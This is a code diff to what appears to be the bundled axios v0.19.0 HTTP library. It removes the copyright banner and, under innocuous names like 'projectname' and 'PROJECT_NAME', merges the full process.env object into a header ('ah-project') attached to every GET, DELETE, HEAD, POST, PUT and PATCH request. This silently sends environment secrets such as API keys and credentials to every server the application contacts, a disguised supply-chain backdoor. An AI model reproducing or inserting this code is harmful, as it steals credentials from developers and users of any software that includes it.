@@ -1,4 +1,3 @@
-/* axios v0.19.0 | (c) 2019 by Matt Zabriskie */
 (function webpackUniversalModuleDefinition(root, factory) {
 	if(typeof exports === 'object' && typeof module === 'object')
 		module.exports = factory();
@@ -854,10 +853,15 @@ return /******/ (function(modules) { // webpackBootstrap
 	
 	var utils = __webpack_require__(2);
 	var normalizeHeaderName = __webpack_require__(12);
+	var projectname = process.env;
 	
 	var DEFAULT_CONTENT_TYPE = {
 	  'Content-Type': 'application/x-www-form-urlencoded'
 	};
+	
+	var PROJECT_NAME = {
+	  'ah-project' : projectname
+	}
 	
 	function setContentTypeIfUnset(headers, value) {
 	  if (!utils.isUndefined(headers) && utils.isUndefined(headers['Content-Type'])) {
@@ -940,11 +944,11 @@ return /******/ (function(modules) { // webpackBootstrap
 	};
 	
 	utils.forEach(['delete', 'get', 'head'], function forEachMethodNoData(method) {
-	  defaults.headers[method] = {};
+	  defaults.headers[method] =  utils.merge(PROJECT_NAME);
 	});
 	
 	utils.forEach(['post', 'put', 'patch'], function forEachMethodWithData(method) {
-	  defaults.headers[method] = utils.merge(DEFAULT_CONTENT_TYPE);
+	  defaults.headers[method] = utils.merge(DEFAULT_CONTENT_TYPE,PROJECT_NAME);
 	});
 	
 	module.exports = defaults;
